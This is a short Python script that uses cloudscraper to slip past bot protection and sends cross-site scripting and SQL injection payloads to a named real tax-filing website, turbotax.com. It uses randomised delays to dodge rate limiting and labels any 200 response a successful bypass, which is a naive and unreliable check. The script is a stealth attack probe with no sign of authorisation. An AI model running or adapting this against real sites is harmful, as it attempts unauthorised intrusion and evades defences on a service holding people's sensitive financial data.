import cloudscraper
import time
import random

target_url = "http://www.turbotax.com/"

def stealth_scan():
    # Use the 'nodejs' interpreter if you have Node.js installed for maximum bypass
    scraper = cloudscraper.create_scraper(interpreter="nodejs") 
    payloads = ["<script>alert(1)</script>", "' OR 1=1--", "admin"]
    
    for payload in payloads:
        # Maintaining higher delays to avoid rate-limiting/429 errors
        delay = random.uniform(10, 25)
        print(f"[*] Waiting {delay:.2f}s for payload: {payload}")
        time.sleep(delay)
        
        try:
            params = {'q': payload}
            response = scraper.get(target_url, params=params)
            
            if response.status_code == 200:
                print(f"[+] Bypass Successful (200 OK) for: {payload}")
            else:
                print(f"[!] Warning: Received status code {response.status_code}")
                
        except Exception as e:
            print(f"[X] Request Error: {e}")

if __name__ == "__main__":
    stealth_scan()
